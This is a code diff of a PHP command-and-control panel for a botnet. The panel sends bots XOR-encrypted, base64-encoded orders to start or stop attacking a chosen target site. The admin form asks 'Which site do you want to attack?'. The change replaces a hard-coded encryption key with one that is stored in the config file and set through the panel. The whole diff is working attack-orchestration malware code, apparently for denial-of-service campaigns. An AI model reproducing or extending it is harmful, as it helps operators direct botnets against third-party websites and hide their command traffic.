@@ -20,16 +20,16 @@
 ########################################################################
 */
 
-function xor_commands($string) {
-	$key = ('gT8jUdw65h');
-	$text =$string;
-	$outText = '';
-	for($i=0;$i<strlen($text);) {
-		for($j=0;($j<strlen($key) && $i<strlen($text));$j++,$i++) {
-         		$outText .= $text{$i} ^ $key{$j};
-     		}
-	}
-	return $outText;
+function xor_commands($string, $k) {
+        $text =$string;
+        $key = $k;
+        $outText = '';
+        for($i=0;$i<strlen($text);) {
+                for($j=0;($j<strlen($key) && $i<strlen($text));$j++,$i++) {
+                        $outText .= $text{$i} ^ $key{$j};
+                }
+        }
+        return $outText;
 }
 
 $configFile = "data/config";
@@ -43,6 +43,7 @@ $content = explode("\n", $content);
 
 $order = $content[0];
 $target = $content[1];
+$k = $content[2];
 
 $timestamp = time();
 
@@ -56,7 +57,7 @@ $curPw = $curPw[0];
 if($_GET['p'] == "bot") {
 	// encrypt commands
 	$unencryptedCommands = $order."\n".$target;
-	$encryptedCommands = xor_commands($unencryptedCommands);
+	$encryptedCommands = xor_commands($unencryptedCommands, $k);
 	print base64_encode($encryptedCommands);
 
 	// filter html stuff
@@ -100,13 +101,14 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
         }
 
 	// save new config
-	if($_GET['order'] != "" && $_GET['target'] != "") {
+	if($_GET['order'] != "" && $_GET['target'] != "" && $_GET['key'] != "") {
 		// filter target parameter
 		$order = $_GET['order'];
                 $target = strip_tags($_GET['target']);
+		$k = strip_tags($_GET['key']);
 
 		$writeConf = fopen($configFile, "w");
-		fwrite($writeConf, $order."\n".$target);
+		fwrite($writeConf, $order."\n".$target."\n".strip_tags($_GET['key']));
 		fclose($writeConf);
 	}
 
@@ -209,11 +211,12 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "</div>";
 
 	// change orders form
-	print "<h3>Broadcast New Orders</h3>";
+	print "<h3>Bot Configuration</h3>";
 	print "<div>";
 	print "<form method=\"get\">";
-	print "<table border=\"0\"><tr><td>";
-	print "<select name=\"order\" id=\"attackorder\">";
+	print "<table border=\"0\"><tr><td>Target:</td>";
+	print "<td><input id=\"input\" title=\"Which site do you want to attack?\" type=\"text\" name=\"target\" value=\"".$target."\"></td>";
+	print "<td><select name=\"order\" id=\"attackorder\">";
 	if($order == "no") {
 		print "<option value=\"yes\">start attack</option>";
 		print "<option value=\"no\">stop attack</option>";
@@ -223,14 +226,15 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
                 print "<option value=\"yes\">start attack</option>";
 	}
 	print "</select></td>";
-        print "<td><input id=\"input\" title=\"Which site do you want to attack?\" type=\"text\" name=\"target\" value=\"".$target."\"></td>";
 	if ($_GET['np'] == "" || $_GET['npc'] == "" || $_GET['np'] != $_GET['npc']) {
 		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['p']."\">";
 	}
 	else {
 		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['np']."\">";
 	}
-        print "<td><input id=\"loginButton\" type=\"Submit\" value=\"Submit\" onclick=\"go()\"></td>";
+        print "</tr><tr>";
+	print "<td>Encryption key:</td><td><input id=\"input\" title=\"Set the key your bot uses for communication encryption.\" type=\"text\" name=\"key\" value=\"".$k."\"></td></tr><tr>";
+	print "<td></td><td><input id=\"loginButton\" type=\"Submit\" value=\"Submit\"></td>";
 	print "</tr></table>";
         print "</form>";
 	print "</div>";
